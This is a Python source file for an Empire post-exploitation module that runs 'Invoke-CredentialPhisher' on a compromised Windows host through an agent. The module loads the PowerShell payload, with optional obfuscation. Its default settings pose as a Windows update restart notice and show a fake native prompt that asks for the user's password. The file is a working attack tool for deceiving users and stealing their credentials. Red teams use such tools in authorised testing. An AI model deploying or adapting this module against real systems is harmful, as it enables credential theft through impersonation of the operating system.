from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-CredentialPhisher',

            'Author': ['Powershell script by @foxit', 'Empire implementation by @Quickbreach'],

            'Description': ("Spawns a native toast notification that, if clicked, "
                            "prompts the current user to enter their credentials into a native looking prompt. Notification stays on screen for ~25 seconds. "
                            "Requires Windows >= 8.1/2012"),

            'Background': False,

            'OutputExtension': None,

            'NeedsAdmin': False,

            'OpsecSafe': False,

            'Language': 'powershell',

            'MinLanguageVersion': '2',

            'Comments': [
                'https://www.fox-it.com/en/insights/blogs/blog/phishing-ask-and-ye-shall-receive/'
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            'Agent': {
                'Description':   'Agent to phish credentials from',
                'Required'   :   True,
                'Value'      :   ''
            },
            'ToastTitle': {
                'Description':   'Title of toast notification box',
                'Required'   :   True,
                'Value'      :   '"Windows will restart in 5 minutes to finish installing updates"'
            },
            'ToastMessage': {
                'Description':   'Message of toast notification box',
                'Required'   :   True,
                'Value'      :   '"Windows will soon restart to complete applying recently installed updates. Use the drop down below to reschedule the restart for a later time."'
            },
            'Application': {
                'Description':   'Name of the application to claim launched the prompt (ie. "outlook", "explorer")',
                'Required'   :   True,
                'Value'      :   '"System Configuration"'
            },
            'CredBoxTitle': {
                'Description':   'Title on the box prompting for credentials',
                'Required'   :   True,
                'Value'      :   '"Are you sure you want to reschedule restarting your PC?"'
            },
            'CredBoxMessage': {
                'Description':   'Message of the box prompting for credentials',
                'Required'   :   True,
                'Value'      :   '"Authentication is required to reschedule a system restart"'
            },
            'ToastType': {
                'Description':   'Type of Toast notification ("System" or "Application")',
                'Required'   :   True,
                'Value'      :   'System'
            },
            'VerifyCreds': {
                'Description':   'Switch. True/False to verify the creds a user provides, and prompt them again until they either click cancel or enter valid creds (default = false)',
                'Required'   :   False,
                'Value'      :   ''
            },
            'HideProcess': {
                'Description':   'Switch. True/False to hide the window of the process we claim launched the prompt (default = false)',
                'Required'   :   False,
                'Value'      :   ''
            },
        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters are passed as
        #   an object set to the module and the options dictionary is
        #   automatically set. This is mostly in case options are passed on
        #   the command line.
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # The PowerShell script itself, with the command to invoke for
        #   execution appended to the end. Scripts should output everything
        #   to the pipeline for proper parsing.
        #
        # If you're planning on storing your script in module_source as a ps1,
        #   or if you're importing a shared module_source, use the first
        #   method to import it and the second to add any additional code and
        #   launch it.
        #
        # If you're just going to inline your script, you can delete the first
        #   method entirely and just use the second. The script should be
        #   stripped of comments, with a link to any original reference script
        #   included in the comments.
        #
        # First method: Read in the source script from module_source
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Invoke-CredentialPhisher.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        # If you'd just like to import a subset of the functions from the
        #   module source, use the following:
        #   script = helpers.generate_dynamic_powershell_script(moduleCode, ["Get-Something", "Set-Something"])
        script = moduleCode

        scriptEnd = "Invoke-CredentialPhisher"

        # Add any arguments to the end execution of the script
        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
